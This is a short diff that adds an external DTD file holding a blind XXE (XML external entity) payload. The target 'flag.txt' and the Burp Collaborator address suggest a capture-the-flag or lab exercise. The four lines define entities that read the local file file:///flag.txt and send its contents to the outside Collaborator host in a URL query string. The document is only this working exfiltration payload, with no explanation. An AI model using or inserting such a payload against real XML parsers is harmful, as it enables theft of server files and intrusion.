@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://lazxo8hc2cxxkbbjzfft67qeo5uxim.burpcollaborator.net/?a=%file;'>">
+%eval;
+%test;
